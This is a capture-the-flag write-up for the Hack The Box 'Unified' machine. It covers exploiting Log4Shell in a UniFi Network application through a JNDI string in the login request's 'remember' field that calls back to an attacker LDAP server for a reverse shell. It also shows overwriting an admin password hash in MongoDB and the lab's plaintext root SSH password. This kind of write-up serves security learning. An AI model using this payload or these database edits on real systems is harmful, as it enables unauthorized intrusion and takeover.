# Unified
> https://app.hackthebox.com/starting-point?tier=2

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/321b684f-b1b5-4214-bd7e-a80170327f78" />

## Table of Contents

* [About](#about)
* [References](#references)
* [Reconnaissance](#reconnaissance)
* [CVE-2021-44228](#cve-2021-44228)
* [Exploitation: Rogue JNDI](#exploitation---rogue-jndi)
* [Exploitation: Metasploit](#exploitation---metasploit)
* [Database Enumeration](#database-enumeration)
* [Dashboard Access](#dashboard-access)
* [Privilege Escalation](#privilege-escalation)
* [Conclusion](#conclusion)

## About

Unified was an Ubuntu machine running a vulnerable version of the UniFi Network Application. The challenge revolves around exploiting the Log4Shell vulnerability to gain initial access, manipulating the MongoDB database to gain _administrator_ access to the UniFI dashboard, and escalating privileges by leveraging plain-text SSH credentials stored under _UniFI Device Authentication Settings_.

## References

[Rogue JNDI](https://github.com/veracode-research/rogue-jndi)  
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)  
[Log4j Unifi Exploit](https://github.com/puzzlepeaches/Log4jUnifi)  
[Rapid7 Log4Shell Module](https://www.rapid7.com/db/modules/exploit/multi/http/ubiquiti_unifi_log4shell/)  
[UniFi Enterprise Systems](https://www.ui.com/)  
[Another Log4j on the Fire](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)  
[Exploiting JNDI Injections](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)  
[MongoDB Documentation](https://www.mongodb.com/docs/manual/tutorial/getting-started/)  
[Metasploit Log4Shell Exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/ubiquiti_unifi_log4shell.rb)  
[UniFi Network Application Release Notes](https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1)

## Reconnaissance

Initial port scanning revealed the following open TCP ports:

- __22__: (OpenSSH 8.2p1 Ubuntu)
- __6789__: (Unidentified service)
- __8080__: (Apache Tomcat: HTTP proxy)
- __8443__: (Nagios NSCA: UniFi Network Application)

<img width="1902" height="984" alt="0" src="https://github.com/user-attachments/assets/e935b436-d8cb-4029-bc62-dd9040f0b413" />

<br>
<br>

Visiting the web page at port 8443 revealed an instance of the _UniFi Network_ from [UniFi enterprise systems](https://www.ui.com/). The product version displayed below the logo was __6.4.54__.

<img width="1914" height="1027" alt="1" src="https://github.com/user-attachments/assets/7ecfd48e-7d5d-43a5-b8e2-372ae171ed0e" />

## CVE-2021-44228

From [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/cve-2021-44228):

_"The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell vulnerability. This allows an attacker to send a JNDI string to the server via the `remember` field of a POST request to the `/api/login` endpoint. The server connects to the attacker and deserializes a malicious Java object, resulting in OS command execution in the context of the server application."_

__JNDI__ (_Java Naming and Directory Interface_) is an API in Java that provides naming and directory functionality, allowing Java applications to look up data and resources such as objects, services, or files in a directory service. __JNDI__ injection occurs when untrusted data is used to construct JNDI lookups, allowing attackers to load malicious objects from remote servers.

The Log4Shell vulnerability leverages this by injecting a crafted JNDI string into log messages processed by the vulnerable Log4j library. This results in arbitrary code execution when the application resolves the malicious JNDI reference.

### Exploitation: Rogue JNDI

> __Note:__ The IP address was updated from `10.129.96.149` to `10.129.51.164` because the Rogue JNDI method was added after completing the challenge and resetting the box.

From [veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi):

_"The project contains __LDAP__ & __HTTP__ servers for exploiting insecure-by-default Java JNDI API.
In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:"_

```java
InitialContext.doLookup("ldap://your_server.com:1389/o=reference");
```

_"It will initiate a connection from the vulnerable client to the local LDAP server. Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a __Remote Code Execution__."_

I started the _Rogue JNDI_ __LDAP__ server and added a reverse shell as a payload. To trigger it, I sent a __POST__ request to `/api/login` and set `"${jndi:ldap/<ip-addr>:1389/o=tomcat}"` as the `remember` JSON value.

```json
{
    "username": "<username>",
    "password": "<password>",
    "remember": "${jndi:ldap://10.10.14.20>:1389/o=tomcat}",
    "strict": true
}
```

<img width="1900" height="993" alt="x" src="https://github.com/user-attachments/assets/8860055d-45fb-49bd-a31e-846dd2eea13b" />

### Exploitation: Metasploit

The Log4Shell vulnerability can be exploited using the Metasploit module [ubiquiti_unifi_log4shell](https://www.rapid7.com/db/modules/exploit/multi/http/ubiquiti_unifi_log4shell/). This module automates the process of sending a malicious JNDI string to the vulnerable endpoint. After running the exploit i gained access as `unifi@unified.htb`.

<img width="1605" height="881" alt="2" src="https://github.com/user-attachments/assets/da99753f-12e9-4963-90f4-fc0a2cc099c3" />

## Database Enumeration

The UniFi Network Application uses __MongoDB__ for its database operations. The default database name is `ace`. Searching for MongoDB processes revealed an instance running as the `unifi` user on port __27117__.

Examining the MongoDB configuration file confirmed the database options:

```json
{ net: { bindIp: "127.0.0.1", port: 27117, unixDomainSocket: { pathPrefix: "/usr/lib/unifi/run" } }, processManagement: { pidFilePath: "/usr/lib/unifi/run/mongod.pid" }, storage: { dbPath: "/usr/lib/unifi/data/db" }, systemLog: { destination: "file", logAppend: true, logRotate: "reopen", path: "/usr/lib/unifi/logs/mongod.log" } }
```

<img width="1901" height="438" alt="3" src="https://github.com/user-attachments/assets/e7afcf45-bc59-4b25-ac9f-f5e9bde9d7c1" />

<br>
<br>

Interacting with the `ace` database revealed several [collections](https://www.mongodb.com/docs/manual/core/databases-and-collections/), with the `admin` collection being the most promising. Listing its entries showed keys such as __\_id__, __email__, __name__, and __x_shadow__.

<img width="1402" height="691" alt="4" src="https://github.com/user-attachments/assets/cd94cefb-ff67-4fcd-82f3-d96976c91cf0" />

## Dashboard Access

By replacing the password hash for the `administrator` user in the `admin` collection with a known value, I was able to access the UniFi Network dashboard.

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":<hash>}})'
```

<img width="1899" height="217" alt="5" src="https://github.com/user-attachments/assets/eaed274b-5adb-403e-ba59-f3968a76dfbd" />

<img width="1917" height="1056" alt="6" src="https://github.com/user-attachments/assets/92881a05-1749-4bef-9ff8-d469d01e0f1f" />

<br>
<br>

The dashboard displayed placeholder data, graphs, and metrics about connected devices and network usage. Unfortunately, no useful information was found.

## Privilege Escalation

Under __Settings > Device Authentication__:

- _Authentication between elements (devices) and the controller._
- _No SSH keys have been defined. SSH Credentials can be seen and changed by all of Site Admins._

SSH authentication was enabled, revealing plain-text credentials for the `root` user: `root::NotACrackablePassword4U2022`. This allowed me to log in via SSH as `root` and complete the challenge.

<img width="1905" height="954" alt="7" src="https://github.com/user-attachments/assets/8297f1ad-1e90-46dc-931e-a45fe5ed6404" />

## Conclusion

The Unified machine demonstrated several critical vulnerabilities:

- __Log4Shell Vulnerability__: Exploiting the JNDI injection allowed remote code execution.
- __Insecure Authentication Settings__: Plain-text credentials were exposed, enabling privilege escalation.

These vulnerabilities highlight the importance of patch management and proper authentication mechanisms.
